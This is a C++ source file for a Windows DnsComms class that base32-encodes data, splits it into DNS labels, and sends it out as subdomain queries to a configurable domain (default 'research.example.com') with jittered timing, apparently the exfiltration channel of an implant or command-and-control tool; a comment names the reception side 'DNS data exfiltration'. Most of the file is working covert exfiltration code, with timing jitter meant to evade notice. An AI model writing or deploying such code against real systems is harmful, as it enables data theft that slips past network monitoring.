#include "communication/DnsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"   
#include "utils/StringUtils.h"
#include "utils/TimeUtils.h"
#include <vector>
#include <sstream>
#include <cstdint>
#include <string>
#include <winsock2.h>
#include <windns.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "dnsapi.lib")

DnsComms::DnsComms(Configuration* config)
    : m_config(config), m_dnsServer("8.8.8.8") {}

DnsComms::~DnsComms() {
    DnsComms::Cleanup();
}

bool DnsComms::Initialize() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        LOG_ERROR("WSAStartup failed");
        return false;
    }

    // Parse DNS server from configuration if available
    std::string server = m_config->GetValue("dns_server", "8.8.8.8");
    m_dnsServer = server;
    
    LOG_INFO("DNS communication initialized with server: " + server);
    return true;
}

bool DnsComms::SendData(const std::vector<uint8_t>& data) {
    // Encode data as base32 for DNS compatibility
    std::string encodedData = utils::StringUtils::Base32Encode(data);
    
    // Split into chunks for DNS labels (max 63 bytes per label)
    std::vector<std::string> chunks;
    for (size_t i = 0; i < encodedData.length(); i += 50) {
        chunks.push_back(encodedData.substr(i, 50));
    }

    return SendDataInternal(chunks);
}

bool DnsComms::SendDataInternal(const std::vector<std::string>& chunks) const {
    bool overallSuccess = true;
    
    for (const auto& chunk : chunks) {
        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
        
        DNS_STATUS status = DnsQuery_A(
            query.c_str(),
            DNS_TYPE_A,
            DNS_QUERY_STANDARD,
            NULL,
            NULL,
            NULL
        );

        if (status != 0) {
            LOG_DEBUG("DNS query failed: " + std::to_string(status));
            overallSuccess = false;
        }

        utils::TimeUtils::JitterSleep(100, 0.3);
    }

    return overallSuccess;
}

void DnsComms::Cleanup() {
    WSACleanup();
    LOG_DEBUG("DNS communication cleaned up");
}

bool DnsComms::TestConnection() const {
    return TestConnectionInternal();
}

bool DnsComms::TestConnectionInternal() const {
    PDNS_RECORD dnsRecord;
    DNS_STATUS status = DnsQuery_A(
        "google.com",
        DNS_TYPE_A, 
        DNS_QUERY_STANDARD,
        NULL,
        &dnsRecord,
        NULL
    );

    if (status == 0) {
        DnsRecordListFree(dnsRecord, DnsFreeRecordList);
        return true;
    }
    
    return false;
}

std::vector<uint8_t> DnsComms::ReceiveData() {
    // Implement DNS data exfiltration reception
    // This would typically involve running a DNS server
    return {};
}